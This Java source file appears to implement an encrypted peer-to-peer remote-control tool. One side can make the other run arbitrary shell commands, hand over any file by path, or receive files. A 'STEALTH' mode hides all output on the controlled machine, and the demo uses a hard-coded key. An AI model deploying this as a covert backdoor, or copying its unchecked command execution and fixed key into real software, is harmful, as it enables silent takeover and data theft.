import org.json.JSONObject;
import java.io.*;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.security.Key;
import java.util.Arrays;
import java.util.Base64;
import java.util.Scanner;

/**
 * Created by Obada on 2016-09-12.
 *
 */

class Client
{
    private InputStream input;
    private OutputStream output;
    private Socket socket;
    private final String DESKTOP = System.getProperty("user.home") + "/Desktop";
    // Set the downloaded file directory to desktop initially
    private String DOWNLOAD_DIR = DESKTOP + "/";
    private final int MB = 1024 * 1024;
    enum MODE {STEALTH, NORMAL}
    private MODE mode;
    // Encryption Key same as used in the server you're connecting to..(shared with the server)
    private Key serverKey;

    private Executor exe;

/*
    This constructor won't create a special folder for the downloaded files, the default path (Desktop) will be selected instead
    @para Socket
*/
Client(Socket socket, MODE mode, String key)
{
    if(key.length() < 16)
    {
        System.err.println("The encryption keys are incorrect (not 128 bit keys)");
        System.exit(1);
    }
    exe = new Executor();
    this.serverKey = Utilities.generateKey(key);

    connect(socket);
    this.mode = mode;
    if(mode.equals(MODE.NORMAL)) System.out.println("> Connected to: " + socket.getInetAddress());
    new Thread(this::listen).start();
}
/*
    this constructor will be called by the client where they can specify the name of the folder to download the files to
    @para Socket
    @para folder "Title only not a full path"
*/
Client(Socket socket, String folder, MODE mode, String key)
{
    if(key.length() < 16)
    {
        System.err.println("The encryption keys are incorrect (not 128 bit keys)");
        System.exit(1);
    }
    exe = new Executor();
    this.serverKey = Utilities.generateKey(key);

    DOWNLOAD_DIR = DESKTOP + "/" + folder + "/";
    File file = new File(DOWNLOAD_DIR);
    if(!file.exists())
    {
        if(!file.mkdir())
        {
            if(mode.equals(MODE.NORMAL))
                System.err.println("Couldn't create download folder");
            DOWNLOAD_DIR = DESKTOP;
        }
    }
    connect(socket);
    if(mode.equals(MODE.NORMAL)) System.out.println("> Connected to: " + socket.getInetAddress());
    new Thread(this::listen).start();
}
private void connect(Socket sock)
{
    this.socket = sock;
    try
    {
        socket.setKeepAlive(true);
        input = socket.getInputStream();
        output = socket.getOutputStream();
    } catch (IOException e)
    {
        e.printStackTrace();
    }
}
private byte[] getObject()
{
    byte[] received;
    ByteArrayOutputStream buffer = new ByteArrayOutputStream();
    try
    {
        ObjectInputStream inputStream = new ObjectInputStream(input);
        while ((received = (byte[]) inputStream.readObject()) != null)
        {
            buffer.write(received);
        }
        return buffer.toByteArray();
    } catch (Exception e)
    {
        e.printStackTrace();
    }
    return null;
}
private void sendObject(byte[] bytes)
{
    ObjectOutputStream out = null;
    try
    {
        out = new ObjectOutputStream(output);
        if(bytes.length<MB)
            out.writeObject(bytes);
        else
        {
            int setOff=0;
            while ((setOff+=MB) < bytes.length)
                out.writeObject(Arrays.copyOfRange(bytes, setOff-MB, setOff)); // write one MB at a time
            if((setOff-=MB) < bytes.length)
                out.writeObject(Arrays.copyOfRange(bytes, setOff, bytes.length)); // Write the left overs from the bytes array
        }
        out.writeObject(null); // end signal
    } catch (Exception e)
    {
        if(out!=null) try {
            out.writeObject(null);
        } catch (IOException e1) {
            e1.printStackTrace();
        }
        e.printStackTrace();
    }
}

void listen()
{
    byte[] bytes;
    while(true)
    {
        bytes = getObject();
        if(bytes == null) continue;
        try
        {
            // Decrypt the array coming from the server
            JSONObject json = new JSONObject(new String(Utilities.decrypt(bytes, serverKey)));
            // Type of info this object is holding
            switch (json.getString("type"))
            {
                // The object is holding a file bytes {type: file, data: "binary", file_name: "name", file_extension: ".txt"}
                case "file":
                    new Thread(() -> {
                        if(mode == MODE.NORMAL)
                            System.out.println("Downloading file....");
                        byte[] fileBytes;
                        try
                        {
                            fileBytes = Base64.getDecoder().decode(json.getString("data"));
                            // Write the file to the hard disk
                            Utilities.writeFile(fileBytes, DOWNLOAD_DIR + json.getString("file_name") + ((json.getString("file_extension").length()>0) ? "." + json.getString("file_extension") : ""));
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                        if(mode == MODE.NORMAL)
                            System.out.println("file downloaded..");
                    }).start();
                    break;
                case "request":
                    switch (json.getString("data"))
                    {
                        case "get":
                            new Thread(() -> {
                                if(mode == MODE.NORMAL)
                                    System.out.println("uploading the file...");
                                String absPath;
                                try {
                                    absPath = json.getString("path");
                                    byte[] file_Bytes = Utilities.readFile(absPath);
                                    if (file_Bytes == null && mode == MODE.NORMAL)
                                        System.err.println("File requested doesn't exists");
                                    JSONObject toSend = new JSONObject();
                                    toSend.put("type","file");
                                    toSend.put("data", Base64.getEncoder().encodeToString((file_Bytes == null ? new byte[0] : file_Bytes)));
                                    if(absPath.contains("."))
                                    {
                                        toSend.put("file_name",absPath.substring(absPath.lastIndexOf('/') + 1, absPath.lastIndexOf('.')));
                                        toSend.put("file_extension", absPath.substring(absPath.indexOf('.') + 1, absPath.length()));
                                    }
                                    else
                                    {
                                        toSend.put("file_name",absPath.substring(absPath.lastIndexOf('/') + 1, absPath.length()));
                                        File file = new File(absPath);
                                        toSend.put("file_extension", (file.isDirectory() ? "zip" : ""));
                                    }
                                    // Encrypt with serverKey and send it to the server
                                    sendObject(Utilities.encrypt(toSend.toString().getBytes(), serverKey));
                                    if(mode == MODE.NORMAL)
                                        System.out.println("file uploaded");
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }
                            }).start();
                            break;
                        case "cmd":
                            JSONObject toSend = new JSONObject();
                            toSend.put("type","reply");
                            toSend.put("reply",new String(exe.Execute(json.getString("command"))));
                            sendObject(Utilities.encrypt(toSend.toString().getBytes(), serverKey));
                            break;
                    }
                    break;
                case "reply":
                    // Choose what to do with the reply either printout to the console or printout in your GUI
                    System.out.println(">"+json.getString("reply"));
                    break;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}

/*
    Read from the console
 */
private void console() throws IOException {
    Scanner scanner;
    String rx = "[^\\\"\\\\s]+|\\\"(\\\\\\\\.|[^\\\\\\\\\\\"])*\\\"";
    String line;
    BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
    while((line = reader.readLine()) != null)
    {
        scanner = new Scanner(line);
        JSONObject json = new JSONObject();
        try
        {
            switch (scanner.findInLine(rx))
            {
                case "get ":
                    String absPath1 = scanner.findInLine(rx);
                    // if the path from the console is only a file name then merge it with the DOWNLOAD_DIR (assuming it's in that dir)
                    // also re-contain the whole string in the quotation marks in case of combining it with the DOWNLOAD_DIR
                    absPath1 = (absPath1.contains("/") ? absPath1 : "\"" + DOWNLOAD_DIR + absPath1.substring(1, absPath1.length()));
                    json.put("type", "request");
                    json.put("data","get");
                    json.put("path",absPath1.substring(1, absPath1.lastIndexOf('\"')));
                    sendObject(Utilities.encrypt(json.toString().getBytes(), serverKey));
                    break;
                case "upload ":
                    String absPath = scanner.findInLine(rx);
                    byte[] fileBytes = Utilities.readFile(absPath.substring(1, absPath.lastIndexOf('\"')));
                    if(fileBytes == null)
                    {
                        if(mode == MODE.NORMAL)
                            System.err.println("Couldn't read file");
                        break;
                    }
                    json.put("data",Base64.getEncoder().encodeToString(fileBytes));
                    if(absPath.contains("."))
                    {
                        json.put("file_name", absPath.substring(absPath.lastIndexOf('/') + 1, absPath.lastIndexOf('.')));
                        json.put("file_extension", absPath.substring(absPath.indexOf('.') + 1, absPath.lastIndexOf('\"')));
                    }else
                    {
                        json.put("file_name", absPath.substring(absPath.lastIndexOf('/') + 1, absPath.lastIndexOf('\"')));
                        json.put("file_extension","zip");
                    }
                    json.put("type","file");
                    sendObject(Utilities.encrypt(json.toString().getBytes(), serverKey));
                    break;
                case "cmd ":
                    json.put("type", "request");
                    json.put("data", "cmd");
                    String tmp = scanner.findInLine(rx);
                    json.put("command", tmp.substring(1, tmp.length() -1));
                    sendObject(Utilities.encrypt(json.toString().getBytes(), serverKey));
            }
            scanner.close();
        }catch (Exception e)
        {
            e.printStackTrace();
            console();
        }
    }
}
/*
    close the connection for this client
*/
void close()
{
    //put each close statement in a try catch so we make sure all unclosed to close :p
    try {
        output.close();
    } catch (IOException e) {
        e.printStackTrace();
    }
    try {
        input.close();
    } catch (IOException e) {
        e.printStackTrace();
    }
    try {
        socket.close();
    } catch (IOException e) {
        e.printStackTrace();
    }
}
void setDOWNLOAD_DIR(String path)
{
    DOWNLOAD_DIR = path;
}

private String getDOWNLOAD_DIR()
{
    return DOWNLOAD_DIR;
}

public static void main (String[]args)throws Exception
{
    String serverKey = "1234567890123456";
    ServerSocket server = new ServerSocket(1234);
    new Thread(() -> {
        Client c2 = null;
        while(c2==null) try {
            c2 = new Client(server.accept(), MODE.STEALTH, serverKey);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }).start();
    Client c1 = new Client(new Socket("localhost",1234), "custom",MODE.NORMAL, serverKey);
    c1.console();
    c1.close();

}
}